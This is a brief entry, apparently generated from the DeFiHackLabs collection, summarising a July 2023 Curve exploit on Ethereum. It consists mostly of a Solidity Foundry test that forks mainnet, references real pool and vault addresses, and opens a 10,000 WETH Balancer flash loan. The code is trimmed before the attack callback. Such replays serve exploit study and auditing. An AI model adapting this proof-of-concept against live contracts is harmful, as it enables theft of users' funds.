# [?] Curve_exp02 exploit (2023-07)

## Summary
Severity: Unknown
Chain: Ethereum
Component: Curve_exp02
Published: 2023-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp02.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 LP = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);
    ICurve CurvePool = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_807_829);
        vm.label(address(WETH), "WETH");
        vm.label(address(CRV), "CRV");
        vm.label(address(LP), "LP");
        vm.label(address(CurvePool), "CurvePool");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        deal(address(this), 0);
        CRV.approve(address(CurvePool), type(uint256).max);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp02.sol_
